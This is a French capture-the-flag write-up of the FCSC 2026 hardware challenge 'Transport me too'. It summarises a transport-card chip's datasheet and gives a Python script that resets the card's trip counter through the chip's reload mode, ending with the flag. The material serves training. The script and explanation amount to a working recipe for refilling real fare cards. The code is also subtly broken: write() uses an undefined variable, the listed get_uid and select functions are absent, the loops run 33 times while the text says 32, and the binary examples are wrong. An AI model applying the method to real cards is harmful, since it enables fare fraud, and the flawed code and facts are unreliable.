---
title: "FCSC 2026 - Transport me too"
date: 2026-06-11T16:34:04+02:00
draft: false
toc: true
images:
tags: 
  - FCSC 2026
  - FCSC
  - Hardware
  - Transport me too
  - Write-Up
categories:
  - CTF
---

<style>
  [id]{
    scroll-margin-top: 10vh;
  }

  figure {
    text-align: center;
  }
</style>

<div>
  <img src="/posts/images/logo_fcsc.svg" alt="Logo FCSC" style="width: 50%">
  </br>
</div>

Ceci est le write-up du challenge Hardware **Transport me too** du CTF [FCSC](https://fcsc.fr/) édition 2026 organisé par l'ANSSI.

---

## Énoncé

>Vous avez récupéré une carte de transport, basée sur une puce ST25TB512AC de chez STMicroElectronics. Apparemment, cette carte contenait initialement 10 voyages, mais ne peut pas être rechargée. La personne qui vous a donné cette carte a déjà effectué 5 voyages avec.
>
>Arriverez-vous à voyager 1000 fois ?
>
>**Note :** Lors de l'envoi d'une commande brute à la carte, considérez qu'elle est déjà sélectionnée par le lecteur.
>
><div>
>  <img src="/posts/fcsc2026_transport_me_too/images/card.png" alt="Card">
>  </br>
></div>
>
>`nc challenges.fcsc.fr 2301`

---

Ce challenge est la suite, en version bien plus avancée, de [Transport me](/posts/fcsc2026_transport_me/fcsc2026_transport_me).

## Documentation

L'énoncé nous donne le modèle de la puce: **ST25TB512AC** de chez STMicroElectronics. 

On va alors récupérer la documentation sur le [site officiel](https://www.st.com/resource/en/datasheet/st25tb512-ac.pdf).

{{< admonition type=note title="Note" >}}
Pour de la documentation hardware, on peut utiliser le terme `datasheet` dans un moteur de recherche pour en trouver plus facilement, comme ceci: `NomPuce datasheet`.
{{< /admonition >}}

{{< admonition type=warning title="Attention" >}}
Ce chapitre est un résumé section par section des informations importantes dans la [documentation](https://www.st.com/resource/en/datasheet/st25tb512-ac.pdf) de la puce **ST25TB512AC** de chez STMicroElectronics.

Il y aura des rappels au fur et à mesure du chapitre [Résolution](#résolution) pour une lecture plus digeste. Dans un contexte réel, il est très important de bien lire la documentation avant de tenter de résoudre le challenge.
{{< /admonition >}}

<details>
 <summary style="font-weight: bold; text-decoration: underline; cursor: pointer;">Résumé de la documentation</summary>
  <blockquote style="font-style: normal;">

{{< admonition type=note title="Note" >}}
Les sections **2. Signal description**, **5. ST25TB512-AC operation**, **7. Anticollision**, **9. Maximum ratings**, **10. RF electrical parameters** et **11. Ordering informations** ne sont pas intéressantes pour la résolution du challenge car elles concernent uniquement les opérations bas niveau (modulation, trames, niveaux électriques, etc).
{{< /admonition >}}

### Sommaire

- [**Summary**](#summary)
- [**1. Description**](#1-description)
  - [Figure 1 - Description 1](#description-1)
  - [Figure 2 - Description 2](#description-2)
- [**3. Data transfer**](#3-data-transfer)
  - [Figure 3 - CRC](#crc-figure)
- [**4. Memory mapping**](#4-memory-mapping)
  - [Tableau 1 - Mappage mémoire](#memory-mapping)
  - [**4.1.1. Block 0 - 4: resettable OTP area**](#411-block-0---4-resettable-otp-area)
    - [Figure 4 - Eeprom 1](#eeprom-1)
    - [Figure 5 - Eeprom 2](#eeprom-2)
    - [Tableau 2 - Exemple d'écriture en mode reload](#reload-mode)
  - [**4.2. 32-bit binary counters**](#42-32-bit-binary-counters)
    - [Figure 6 - Compteurs binaires 1](#binary-counters-1)
    - [Figure 7 - Compteurs binaires 2](#binary-counters-2)
  - [**4.3.1. OTP_Lock_Reg**](#431-otp_lock_reg)
    - [Figure 8 - OTP_Lock_reg](#otp_lock_reg)
- [**6. ST25TB512-AC states**](#6-st25tb512-ac-states)
  - [Figure 9 - Liste des états](#states)
- [**8. ST25TB512-AC commands**](#8-st25tb512-ac-commands)
  - [Tableau 3 - Codes des commandes](#commandes)
- [**Appendix A. ISO-14443 Type B CRC calculation**](#appendix-a-iso-14443-type-b-crc-calculation)
- [**Appendix B. ST25TB512-AC command brief**](#appendix-b-st25tb512-ac-command-brief)
  - [Figure 10 - Exemple de la commande Select](#exemple-select)
  - [Figure 11 - Exemple de la commande Read_block](#exemple-read)
  - [Figure 12 - Exemple de la commande Write_block](#exemple-write)
  - [Figure 13 - Exemple de la commande GetUID](#exemple-getuid)

---

### Summary

La première page nous donne déjà quelques informations utiles sur la puce, comme:

- Les normes ISO utilisées (**ISO 14443-2** et **ISO 14443-2**)
- Le fait qu'il y ait **deux compteurs binaires**
- Qu'il y a une fonction **Read-block** et **Write_block**
- Que les blocs de ces dernières sont sur **32 bits**

---

### 1. Description

Ici, nous avons les 9 commandes disponibles:

- Read_block
- Write_block
- Initiate
- Pcall 16
- Slot_marker
- Select
- Completion
- Reset_to_inventory
- Get_UID

Ainsi que la taille des blocs: **32 bits**

<figure id="description-1">
  <img src="/posts/fcsc2026_transport_me_too/images/description_1.png" alt="Description 1">
  </br>
  <figcaption><i>Figure 1 - Description 1</i></figcaption>
  </br>
</figure>

Nous avons également des informations sur les 3 zones importantes de la mémoire:

- **Zone 1 - OTP (One time programmable):** Décrémente en passant les bits à 0 un par un, une **commande spéciale** permet de tous les re-passer à 1
- **Zone 2 - Compteurs binaires:** 2 compteurs binaires de 32bits, peuvent **seulement être décrémentés**
- **Zone 3 - Mémoire EEPROM:** Seulement accessible via des blocs de 32bits, il y a un **cycle d'auto-effacement** à chaque commande d'écriture

Un [tableau](#memory-mapping) détaillant ces zones est disponible dans la section [4. Memory mapping](#4-memory-mapping).

<figure id="description-2">
  <img src="/posts/fcsc2026_transport_me_too/images/description_2.png" alt="Description 2">
  </br>
  <figcaption><i>Figure 2 - Description 2</i></figcaption>
  </br>
</figure>

---

### 3. Data transfer

Cette section est principalement orientée bas niveau, on a cependant une information très importante qu'est le détail du CRC.

On y apprend que:

- Le CRC est généré en accord avec la norme **ISO14443 Type B**
- Il est sur 2 octets (4 caractères)
- Il est à ajouter à la fin de chaque commande
- Il est ajouté à chaque réponse
- Il est obligatoire

<figure id="crc-figure">
  <img src="/posts/fcsc2026_transport_me_too/images/crc.png" alt="CRC">
  <br>
  <figcaption><i>Figure 3 - CRC</i></figcaption>
  </br>
</figure>

---

### 4. Memory mapping

Cette section nous donne le mappage des différents blocs avec leur **adresse**, leur **taille**, **type** ainsi qu'une **description**:

<figure id="memory-mapping">
  <img src="/posts/fcsc2026_transport_me_too/images/memory_mapping.png" alt="Memory mapping">
  </br>
  <figcaption><i>Tableau 1 - Mappage mémoire</i></figcaption>
  </br>
</figure>

#### 4.1.1. Block 0 - 4: resettable OTP area

Cette partie est centrée sur la zone OTP (One Time Programmable) réinitialisable.

On apprend qu'il n'est **pas directement possible d'écrire** dans les adresses de cette zone, pour ça, il faut que la commande d'écriture soit précédée d'un **auto-erase cycle**.


<figure id="eeprom-1">
  <img src="/posts/fcsc2026_transport_me_too/images/eeprom_1.png" alt="Eeprom 1">
  </br>
  <figcaption><i>Figure 4 - Eeprom 1</i></figcaption>
  </br>
</figure>

On apprend également qu'un **cycle d'effacement** est ajouté à chaque fois que le mode **reload** est activé. Ce mode est implémenté via une modification spécifique du **compteur binaire** au **bloc d'adresse 6**.

<figure id="eeprom-2">
  <img src="/posts/fcsc2026_transport_me_too/images/eeprom_2.png" alt="Eeprom 2">
  </br>
  <figcaption><i>Figure 5 - Eeprom 2</i></figcaption>
  </br>
</figure>

On nous donne aussi un tableau précisant le comportement de la commande d'écriture en mode **reload**.

<figure id="reload-mode">
  <img src="/posts/fcsc2026_transport_me_too/images/reload_mode.png" alt="Reload mode">
  </br>
  <figcaption><i>Tableau 2 - Exemple d'écriture en mode reload</i></figcaption>
  </br>
</figure>

#### 4.2. 32-bit binary counters

Cette sous-section concerne les 2 compteurs binaires avec l'adresse de bloc 5 et 6.

On y apprend que:

- On peut actualiser ces compteurs uniquement avec une valeur inférieur à la précédente (de 1 ou plus)
- La valeur initiale du compteur 5 est **FFFF FFFE** et **FFFF FFFF** pour le 6
- Quand un compteur arrive à 0000 0000 il n'est plus possible de l'actualiser (du tout, pas de magie)
- Ils peuvent être protégés en écriture par le **OTP_Lock_Reg bits** (bloc 255)

<figure id="binary-counters-1">
  <img src="/posts/fcsc2026_transport_me_too/images/binary_counters_1.png" alt="Binary counters 1">
  </br>
  <figcaption><i>Figure 6 - Compteurs binaires 1</i></figcaption>
  </br>
</figure>

Plus bas, il est expliqué que le **compteur 6** contrôle le **mode reload** de la **zone OTP réinitialisable**. Quand un de ses 11 premiers bits (b31 à b21) est actualisé (modifié), la puce ajoute un **cycle d'effacement** à la commande d'**écriture** dans la zone OTP. 

Ce cycle d'effacement reste actif jusqu'a l'**arrêt** de la carte ou l'utilisation de la commande **select**. On nous précise aussi que la zone OTP peut être **reloaded** (rechargée) 2047 fois.

<figure id="binary-counters-2">
  <img src="/posts/fcsc2026_transport_me_too/images/binary_counters_2.png" alt="Binary counters 2">
  </br>
  <figcaption><i>Figure 7 - Compteurs binaires 2</i></figcaption>
  </br>
</figure>

#### 4.3.1. OTP_Lock_Reg

Ici, l'attention est portée sur le **OTP_Lock_reg**, ce registre permet de verrouiller certains blocs.

On y apprend qu"il y a une correspondance entre les bits **b16 à b31** du registre et les blocs aux **adresses de 0 à 15** (par exemple b16 correspondant à l'adresse de bloc 0, dans la zone OTP).

Si le bit du registre est à 0, le blox à l'adresse correspondante passe en **lecture seule**.

Une fois fait il n'y a **aucune moyen** de revenir en arrière.

De plus, une fois qu'une modification à cette adresse de bloc à été réalisée, il faut envoyer une commande **select** pour l'ajouter à la logique de la puce.

<figure id="otp_lock_reg">
  <img src="/posts/fcsc2026_transport_me_too/images/otp_lock_reg.png" alt="OTP_Lock_reg">
  </br>
  <figcaption><i>Figure 8 - OTP_Lock_Reg</i></figcaption>
  </br>
</figure>

---

### 6. ST25TB512-AC states

Ici, nous avons les différents états de la puce ainsi que l'ordre de "d'intialisation" à respecter pour qu'elle fonctionne, on a donc:

- 1 - Power-off state
- 2 - Ready state
- 3 - Inventory state
- 4 - Selected state
- 5 - Deselected state

<figure id="states">
  <img src="/posts/fcsc2026_transport_me_too/images/states.png" alt="states list">
  </br>
  <figcaption><i>Figure 9 - Liste des états</i></figcaption>
  </br>
</figure>

En lisant les descriptions des états, on remarque que pour arriver à l'état **Selected state**, qui nous permet d'effectuer des opération de lecture et d'écriture, on doit effectuer les commandes suivants: 

`Initiate() -> (Initiate() OU Pcall16() OU Slot_marker()) -> Select(Chip_ID)`

{{< admonition type=note title="Note" >}}
Dans l'énoncé, la note nous dis `Lors de l'envoi d'une commande brute à la carte, considérez qu'elle est déjà sélectionnée par le lecteur.`, nous sommes alors dans l'état **Selected state** par défaut (Ouf !).
{{< /admonition >}}

---

### 8. ST25TB512-AC commands

Ici, le tableau **Table 10. Command code** nous donne la liste des commandes disponible ainsi que leur code hexadécimal respectifs:

<figure id="commandes">
  <img src="/posts/fcsc2026_transport_me_too/images/command_code_table.png" alt="command code table">
  </br>
  <figcatpion><i>Tableau 3 - Codes des commandes</i></figcaption>
</figure>

{{< admonition type=note title="Note" >}}
le `h` après les valeurs signifie simplement que c'est de l'hexadécimal, un tiret signifie que la commande est sur 2 octets, par exemple pour la commande `Read_block()` et `Initiate()`:
- `08h` -> `08`
- `06h-00h` -> `0600`

Un `x` est une variable, pour `x6h -> slot_marker()`, cela indique ou mettre le numéro de l'emplacement à utiliser (par exemple `176` pour l'emplacement `17`)
{{< /admonition >}}

---

### Appendix A. ISO-14443 Type B CRC calculation

Cette annexe nous donne le code C pour calculer le CRC **ISO-14443 Type B** de chaque commande:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#define BYTE unsigned char
#define USHORT unsigned short
unsigned short UpdateCrc(BYTE ch, USHORT *lpwCrc)
{
ch = (ch^(BYTE)((*lpwCrc) & 0x00FF));
ch = (ch^(ch<<4));
*lpwCrc = (*lpwCrc >> 8)^((USHORT)ch <<
8)^((USHORT)ch<<3)^((USHORT)ch>>4);
return(*lpwCrc);
}
void ComputeCrc(char *Data, int Length, BYTE *TransmitFirst, BYTE
*TransmitSecond)
{
BYTE chBlock; USHORTt wCrc;
wCrc = 0xFFFF; // ISO 3309
do
{
chBlock = *Data++;
UpdateCrc(chBlock, &wCrc);
} while (--Length);
wCrc = ~wCrc; // ISO 3309
*TransmitFirst = (BYTE) (wCrc & 0xFF);
*TransmitSecond = (BYTE) ((wCrc >> 8) & 0xFF);
return;
}
int main(void)
{
BYTE BuffCRC_B[10] = {0x0A, 0x12, 0x34, 0x56}, First, Second, i;
printf("Crc-16 G(x) = x^16 + x^12 + x^5 + 1”);
printf("CRC_B of [ ");
for(i=0; i<4; i++)
printf("%02X ",BuffCRC_B[i]);
ComputeCrc(BuffCRC_B, 4, &First, &Second);
printf("] Transmitted: %02X then %02X.”, First, Second);
return(0);
```

Je l'ai utilisé uniquement pour vérifier les librairies Python que je trouvais, si vous voulez vous en servir, il faut corriger le code comme ceci:

- Ligne 18: changer le **USHORTt** en **USHORT**
- Ligne 33: Changer le **>>** en **"**
- Ligne 38: Changer le **>>** en **"**
- Dernière ligne: Ajouter un **}** a la fin du **int main(void)**

Pour le faire fonctionner, il faut:

- Modifier la taille ainsi que les valeurs du tableau **BYTE BuffCRC_B[10]**
- Modifier la condition du **for(i=0; i<4; i++)**
- Modifier le deuxième paramétre de **ComputeCRC()** comme la condition du **for**

---

### Appendix B. ST25TB512-AC command brief

Cette annexe, nous avons des exemples de commandes correctement formatées.

Par exemple, pour les commandes:

- **Select**:

<figure id="exemple-select">
  <img src="/posts/fcsc2026_transport_me_too/images/select_exemple.png" alt="Select exemple">
  </br>
  <figcaption><i>Figure 10 - Exemple de la commande Select</i></figcaption>
  </br>
</figure>

- **Read_block**:

<figure id="exemple-read">
  <img src="/posts/fcsc2026_transport_me_too/images/read_exemple.png" alt="Read exemple">
  </br>
  <figcaption><i>Figure 11 - Exemple de la commande Read_block</i></figcaption>
  </br>
</figure>

- **Write_block**:

<figure id="exemple-write">
  <img src="/posts/fcsc2026_transport_me_too/images/write_exemple.png" alt="Write exemple">
  </br>
  <figcaption><i>Figure 12 - Exemple de la commande Write_block</i></figcaption>
  </br>
</figure>

- **GetUID**:

<figure id="exemple-getuid">
  <img src="/posts/fcsc2026_transport_me_too/images/getuid_exemple.png" alt="GetUID exemple">
  </br>
  <figcaption><i>Figure 13 - Exemple de la commande GetUID</i></figcaption>
  </br>
</figure>

</blockquote>
</details>

---

## Investigation

La première chose (après lire la documentation) est de se connecter au challenge et regarder qu'elles sont les commandes que l'ont peut envoyer.

### Menu de commandes

Après la connexion, on à ce menu

```txt
1. Travel
2. Send command
3. Quit
```

Via le premier sous-menu **1. Travel**, on peut voyager 5 fois avant d'arriver a court de tickets:

```txt
1. Travel
2. Send command
3. Quit
>>> 1
1 travel completed, 999 more to go


1. Travel
2. Send command
3. Quit
>>> 1
2 travel completed, 998 more to go


1. Travel
2. Send command
3. Quit
>>> 1
3 travel completed, 997 more to go


1. Travel
2. Send command
3. Quit
>>> 1
4 travel completed, 996 more to go


1. Travel
2. Send command
3. Quit
>>> 1
5 travel completed, 995 more to go


1. Travel
2. Send command
3. Quit
>>> 1
No more valid tickets.
```

Pour le second, **2. Send command**, on peut envoyer des commandes en **hexadecimal** à la puce:

```txt
1. Travel
2. Send command
3. Quit
>>> 2
Command to send to the tag (hexadecimal): 
Empty response
```

Et enfin pour le 3ème **3. Quit**, cela clôt la connexion.

---

### Formattage des commandes

Chose très intéressante dans ces menus est la possibilité d'envoyer des commandes hexadecimal, pour savoir comment elle sont formattées, on va voir dans la section [8. ST25TB512-AC commands](#appendix-b-st25tb512-ac-command-brief).

Il ressemble alors à ceci:

```txt
+-----+----------+--------+------+------+-----+
| SOF | Commande | Option | CRCL | CRCH | EOF |
+-----+----------+--------+------+------+-----+
```

Avec:

- **SOF** et **EOF**: Respectivement le début et fin (**\n**) de la trame
- **Commande**: Commande en hexadécimal comme donnée dans le [Tableau 3 - Codes des commandes](#commandes)
- **Option**: Facultatif, dépend de la commande, peut être une adresse, une valeur, etc
- **CRCL** et **CRCH**: Less Significant Bit (LSB) et Most Significant Bit (MSB) du CRC

### CRC

Le CRC est obligatoire pour chaque commande (et réponse) et est généré en accord avec la norme [ISO 14443 Type B](https://en.wikipedia.org/wiki/ISO/IEC_14443) (voir la section [3. Data transfer](#3-data-transfer)).

Dans l'[annexe B](#appendix-a-iso-14443-type-b-crc-calculation), un code en C nous est donné pour calculer ce CRC, étant donné que j'utilise un script Python j'ai cherché une librairie gérant cette partie.

Cette librairie est [crccheck](https://github.com/MartinScharrer/crccheck) de **Martin Scharrer** (disponible sur PyPI) et plus précisement le module **Crc16IbmSdlc**.

Le problème est que cette fonction ne prend que des données de type **bytes** en entrée alors que j'utilise des **strings** dans le reste de mon code. Pour pouvoir l'utiliser nativement j'ai donc créé cette fonction:

```py
def crc(command):
  """
  Return the command with the CRC compliant to the ISO 14443 Type B norm.

  Parameters:
  command (str): The raw hexadecimal command.

  Returns:
  str: The command with the CRC.
  """

  # Convert the str command to bytes
  commande_bytes = bytes.fromhex(command)

  # Calculate the CRC
  crc = Crc16IbmSdlc.calc(commande_bytes) 

  # Format the ouput (command + CRC) with the LSB first
  result = command + crc.to_bytes(2, 'little').hex()

  return(result)
```

Voici ce qu'elle fait:

- Prend une commande en entrée, par exemple `0800` (lecture de l'adresse 00)
- Convertit la commande de **str** en **bytes** en la considérant comme de l'hexadecimal (`b'\x08\x00'`)
- Calcul le CRC via la fonction **Crc16IbmSdlc** de **crccheck**
- Retourne la commande avec son CRC (LSB en premier), comme le veut la norme **ISO** (`080087c1`)

---

## Résolution

OK !

Maintenant que nous avons tous ces éléments, on va pouvoir commencer à interagir avec la puce afin de voyager 1000 fois.

### Identification du compteur

La première chose qu'il nous faut est savoir est l'adresse du bloc contenant le nombre de voyage et comment il fonctionne (est-ce qu'il contient les voyages restants ou alors le nombre de voyages effectués).

Dans la section **4. Memory mapping** de la documentation, on peut voir le [Tableau 1 - Mappage mémoire](#memory-mapping), tableau qui liste toutes les adresses de la mémoire ainsi que des informations les concernants.

Parmi tout ça, on remarque la zone **Resettable OTP bit**, en lisant la [deuxième partie](#description-2) de la description, il est indiqué que cette zone peut uniquement passer de 1 à 0, sauf via une **commande spéciale**.

Des différentes "zones" c'est celle qui a l'air la plus prometteuse pour contenir notre compteur de voyages car il s'agit d'un **compteur réinitialisable** (pour rappel, il s'agit d'une puce sur une carte rechargeable).


{{< admonition type=note title="Note" >}}
Pour arriver à cette conclusion, j'ai procédé par élimination:
- La zone **Lockable EEPROM**, **System OTP bits** et **ROM** ne sont pas des compteurs: possible qu'ils contiennent la donnée mais peu probable
- Les **compteurs binaires** sont des compteurs mais ne peuvent pas être réinitalisés (voir la section [4.2. 32-bits binary counters](#42-32-bit-binary-counters))
{{< /admonition >}}

On va donc faire un script pour lire les 5 adresses de la zone (on réutilise la fonction de CRC vu plus haut):

```py
from crccheck.crc import Crc16IbmSdlc
import socket
import time
import re

def crc(command):
  """
  Return the command with the CRC compliant to the ISO 14443 Type B norm.

  Parameters:
  command (str): The raw hexadecimal command.

  Returns:
  str: The command with the CRC.
  """

  # Convert the str command to bytes
  commande_bytes = bytes.fromhex(command)

  # Calculate the CRC
  crc = Crc16IbmSdlc.calc(commande_bytes) 

  # Format the ouput (command + CRC) with the LSB first
  result = command + crc.to_bytes(2, 'little').hex()

  return(result)

# Open a socket to the challenge URL
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect(("challenges.fcsc.fr", 2301))

# Send the read commande (08h) for the addresses 0 to 5 and print the result
for i in range(0,5):

  # Go to the second menu "Send command"
  socket.sendall(("2\n").encode())

  # Create and send the command
  message = crc("08"+"0"+str(i))+"\n" 
  socket.sendall(message.encode())

  time.sleep(0.1)
  data = socket.recv(1024)

  print(data.decode())
```

{{< admonition type=note title="Note" >}}
On doit inclure le retour à la ligne (`\n`) afin d'émuler l'appuie sur la touche d'`Entrée`, ce qui permet d'indiquer au serveur que la commande est finie.
{{< /admonition >}}

Ce qui nous donne:

```txt
1. Travel
2. Send command
3. Quit
>>> Command to send to the tag (hexadecimal): Response: ffffffff470f


1. Travel
2. Send command
3. Quit
>>> Command to send to the tag (hexadecimal): Response: ffffffff470f


1. Travel
2. Send command
3. Quit
>>> 
Command to send to the tag (hexadecimal): Response: ffffffff470f


1. Travel
2. Send command
3. Quit
>>> 
Command to send to the tag (hexadecimal): Response: 1f000000868d


1. Travel
2. Send command
3. Quit
>>> 
Command to send to the tag (hexadecimal): Response: ffffffff470f
```

{{< admonition type=note title="Note" >}}
Dans les trames de l'[annexe B](#appendix-b-st25tb512-ac-command-brief), on voit qu'il y a aussi un CRC de 2 octets dans la réponse.
Il faut donc enlever les 4 derniers caractères pour avoir la valeur réelle.
{{< /admonition >}}

On voit clairement ici que le seul compteur ayant une valeur différente est le compteur à **l'adresse 03**.

Pour confirmer que c'est bien lui on va voyager et regarder sa valeur:

- Voyage 0: **1f000000**
- Voyage 1: **0f000000**
- Voyage 2: **07000000**
- Voyage 3: **03000000**
- Voyage 4: **01000000**
- Voyage 5: **00000000**

{{< admonition type=note title="Note" >}}
La décrémentation peut ne pas sembler linéaire (1f, 0f, 07, etc) mais si on regarder dans la [description](#1-description), on peut voir que les compteurs de la **Zone 1 - OTP (One time programmable)** décrémente en passant à zéro un bit, ce qui donne en binaire:
- 1111100 -> 1f
- 1111000 -> 0f
- 1110000 -> 07
- 1100000 -> 03
- 1000000 -> 01
- 0000000 -> 00
{{< /admonition >}}

### Manipulation du compteur

Afin d'augmenter le nombre de voyage possible, on va devoir manipuler ce compteur et le passer à la valeur **FFFF FFFF**. Bien que dans la documentation il est indiqué qu'il ne peut que décrémenter, il y a une commande spéciale permettant de passer tous les bits à 1 (voir la section [4.1.1. Block 0 - 4: resettable OTP area](#411-block-0---4-resettable-otp-area)).

Dans cette section, on voit qu'il n'est pas possible de changer la valeur du compteur avec une commande **write_block** si il n'est pas précédé d'un **erase_cycle**. Ce dernier est induit à l'activation d'un **reload mode** via les compteur binaires (adresse 5 et 6).

En lisant la doc de ces compteurs, on apprend que:

- Il sont écrivables (toujours aussi môche) via la commande **write_block** 
- Ils ne peuvent que être décrémentés
- Qu'une fois à zéro il est impossible de les remettre à 1 (il est donc modifiable 2047 fois)
- Que la modification d'un des bits **b31 à 21** du compteur n°6 active le **reload mode** (et donc un **erase cycle**) pour les compteur de l'adresse 0 à 4
- Que ce **erase cycle** reste actif jusqu'a l'extinction du système ou une commande **select**

**On peut alors modifier la valeur du compteur n°3 à sa valeur max (FFFF FFFF) !**

Cependant, on ne pourra voyager que 32 fois (FFFF FFFF donne 32 bits à 1 en binaire). Il faudra alors répéter l'opération 32 fois pour voyager 1000 fois.

Synthétiquement, cela donne ce schéma:

```txt                                                                           
                   ┌───────────────────────┐      
                   │                       │      
                   │                       │      
                   ▼                       │      
     ┌────────────────────────────┐        │      
     │ Modification d'un des bits │        │      
     │                            │        │      
     │ n°31 à 21 du compteur n°6  │        │      
     └────────────────────────────┘        │      
                   │                       │      
                   │                       │      
                   │                       │      
                   │                       │ x32       
                   ▼                       │         
     ┌──────────────────────────────┐      │      
     │ Modification de la valeur du │      │    
     │                              │      │      
     │   compteur n°3 à FFFF FFFF   │      │      
     └─────────────┬────────────────┘      │      
                   │                       │      
                   │                       │      
                   │                       │      
                   │                       │      
                   ▼                       │      
          ┌─────────────────┐              │      
          │ Voyager 32 fois │──────────────┘
          └─────────────────┘                                                                               
```

### Script

Enfin, on a tous les éléments pour écrire notre script, voici ma version:

```py
from crccheck.crc import Crc16IbmSdlc
import socket
import time
import re

def empty_buffer(socket):
    """
    Empty the buffer.

    Parameters:
    socket (socket): Socket object of the connexion.
    """

    socket.setblocking(False)
    while True:
        try:
            socket.recv(1024)
        except:
            break
    socket.setblocking(True)

def crc(command):
    """
    Return the given command with the CRC compliant to the ISO 14443 Type B norm.

    Parameters:
    command (str): The raw hexadecimal command.

    Returns:
    str: The command with the CRC.
    """

    # Convert the str command to bytes
    commande_bytes = bytes.fromhex(command)

    # Calculate the CRC
    crc = Crc16IbmSdlc.calc(commande_bytes) 

    # Format the ouput (command + CRC) with the LSB first
    result = command + crc.to_bytes(2, 'little').hex()

    return(result)

def read(socket, address):
    """
    Read the value of a given addresse.

    Parameters:
    socket (socket): Socket object of the connexion.
    address (str): The address where to read.

    Returns:
    str: The hexadecimal value contained at the address.
    """

    socket.sendall(("2\n").encode())

    message = crc("08"+address)+"\n"
    socket.sendall(message.encode())

    time.sleep(0.1)
    data = socket.recv(1024)

    result = re.search(r"Response:\s+(.*)", data.decode())
    result = result.group(1)

    return result

def write(socket, address, data):
    """
    Write an hexadecimal value at the given address.

    Parameters:
    socket (socket): Socket object of the connexion.
    address (str): The address where to write.
    data (str): The hexadecimal value to write.

    Returns:
    str: The return string of the command from the chip.
    """

    socket.sendall(("2\n").encode())

    message = crc("09"+block+data)+"\n"
    socket.sendall(message.encode())

    time.sleep(0.1)

def travel(socket):
    """
    Select the travel menu.

    Parameters:
    socket (socket): Socket object of the connexion.
    """
    socket.sendall(("1\n").encode())

if __name__ == "__main__":

  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  socket.connect(("challenges.fcsc.fr", 2301))

  block_6_value = "ffffffff"

  for i in range(0,33):

    time.sleep(0.1)

    # Calculate the 1bit decrement of the value of counter n°6
    value = int(block_6_value, 16)
    value -= 0x00000001
    block_6_value = f"{value:08x}"

    # Modify the value of counter n°6 and n°3
    write(socket,"06",block_6_value)
    write(socket,"03","ffffffff")

    # Travel 32x
    for j in range(0,33):
      if j > 31:
        empty_buffer(socket)
      travel(socket)
    
  print(socket.recv(2048).decode())
```

Voici un récap des fonctions:

| **Fonction** | **Description**                                                                                                                                |
|--------------|------------------------------------------------------------------------------------------------------------------------------------------------|
| empty_buffer | Permet de vider le buffer de l'objet **socket**, sans ça, une fois plein il n'enregistre plus les nouveaux éléments de la sortie               |
| crc          | Calcule le CRC (ISO14443 Type B) de la comande en entrée et retourne la commande avec son CRC prête à être utilisée                            |
| get_uid      | Récupère l'UID de la carte car il change à chaque redémarrage (dans le contexte du CTF, à chaque nouvelle connexion) ou après une commande     |
| select       | Permet la remise à zéro du cycle d'effacement vu plus haut                                                                                     |
| read         | Va lire la valeur à l'adresse donnée en entrée, envoie la commande via le sous-menu **2. Send command**                                        |
| write        | Va écrire la valeur à l'adresse, toutes les deux données en entrée, envoie la commande via le sous-menu **2. Send command**                    |
| travel       | Effectue un voyage en activant le sous-menu **1. Travel**                                                                                      |

Le script en lui même va fonctionner comme cela:

```txt
 ┌──────────────────────────┐           
 │ Se connecte au chall via │           
 │                          │           
 │   la librairie socket    │           
 └────────────┬─────────────┘           
              │                         
              │                         
              ▼                             
 ┌─────────────────────────┐          
 │ Calcule le décrément de │          
 │                         │◄─────┐     
 │ 1 bit du compteur n°6   │      │     
 └────────────┬────────────┘      │     
              │                   │  
              │                   │     
              ▼                   │     
 ┌────────────────────────┐       │     
 │  Modifie la valeur des │       │  x32   
 │                        │       │     
 │  compteurs n°6 et n°3  │       │     
 └────────────┬───────────┘       │     
              │                   │     
              │                   │     
              ▼                   │     
    ┌─────────────────┐           │     
    │  Voyage 32 fois ├───────────┘     
    └─────────┬───────┘                 
              │                         
              │                         
              ▼                         
    ┌─────────────────┐                 
    │ Affiche le flag │                 
    └─────────────────┘                 
```

### Flag

En executant le script, le flag nous est donné:

```txt
Congratulations, here is the flag: FCSC{6d6371c7c7ab08a021df2f031b9b50034d12060febf8645d93c4ee81f6fb1b34}
```
---

## Conclusion

Ce challenge hardware était aussi dense qu'intéressant, le fait de le calquer sur un équipement réel et largement utilisé le rend encore plus immersif.

La "faille" utilisée ici est plus une fonctionnalité qu'autre chose. En effet, le fait de pouvoir recharger la carte est voulu dans le design de la puce, il peut même être empêché si besoin (voir la section [4.3.1. OTP_Lock_Reg](#431-otp_lock_reg)).

Le problème ici est son utilisation, pour empêcher son exploitation il aurait fallut:
- Soit utiliser un identifiant unique stocké dans la partie **Lockable EEPROM** et passé en lecture seule via le **OTP_Lock_Reg** (un serveur distant gérerait alors le nombre de voyage ainsi que sa validation)
- Soit utiliser une autre carte/puce avec un fonctionnement différent

Merci à [ElyKar](https://github.com/ElyKar) pour le chall !

---

## Sources
- https://www.st.com/resource/en/datasheet/st25tb512-ac.pdf
- https://docs.python.org/fr/3/howto/sockets.html
- https://www.geeksforgeeks.org/python/bytes-fromhex-method-python/
- https://www.geeksforgeeks.org/python/to-bytes-in-python/